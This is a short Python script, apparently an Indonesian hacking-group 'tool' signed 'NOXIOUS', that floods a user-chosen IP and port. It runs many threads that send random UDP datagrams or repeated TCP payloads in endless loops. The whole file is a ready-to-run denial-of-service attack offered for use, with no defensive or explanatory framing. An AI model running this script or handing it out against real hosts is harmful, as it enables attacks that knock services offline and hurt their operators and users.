import random
import socket
import threading

print (" ╔════════════════════════════════════════════════════════╗")
print (" ║ ███╗░░██╗░█████╗░██╗░░██╗██╗░█████╗░██╗░░░██╗░██████╗  ║")
print (" ║ ████╗░██║██╔══██╗╚██╗██╔╝██║██╔══██╗██║░░░██║██╔════╝  ║")
print (" ║ ██╔██╗██║██║░░██║░╚███╔╝░██║██║░░██║██║░░░██║╚█████╗░  ║")
print (" ║ ██║╚████║██║░░██║░██╔██╗░██║██║░░██║██║░░░██║░╚═══██╗  ║")
print (" ║ ██║░╚███║╚█████╔╝██╔╝╚██╗██║╚█████╔╝╚██████╔╝██████╔╝  ║")
print (" ║ ╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░╚════╝░░╚═════╝░╚═════╝░  ║")
print (" ║                                                        ║")          
print (" ║========================================================║")
print (" ║===============TOOLS BY TEAM EXCRUSHER==================║")
print (" ║===============AUTHOR: NOXIOUS        ==================║")
print (" ║====INI TOOLS GRATIS YA DEK JAN BERHARAP BANGET DAH=====║")
print (" ╚════════════════════════════════════════════════════════╝")

ip = str(input(" ||IP||:"))
port = int(input(" ||PORT||:"))
choice = str(input(" GAS GA NIH?(y/n):"))
times = int(input(" ||Package||"))
threads = int(input(" ||Threads||"))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" GETTING IP")
    except:
      print("||BY NOXIOUS||")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" NOXIOUS|| PAKET SEDANG OTW")
    except:
      s.close()
      print("[*] SUCCES!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()